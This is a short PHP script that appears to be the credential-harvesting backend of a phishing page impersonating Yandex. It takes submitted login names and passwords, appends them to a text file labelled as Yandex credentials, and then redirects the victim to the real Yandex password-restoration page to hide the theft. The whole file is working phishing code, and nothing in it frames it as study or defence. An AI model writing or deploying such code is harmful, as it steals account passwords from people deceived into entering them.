<?php

file_put_contents("usernames.txt", "Yandex Username: " . $_POST['login'] . "\nPassword: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://passport.yandex.com/restoration');
exit();
?>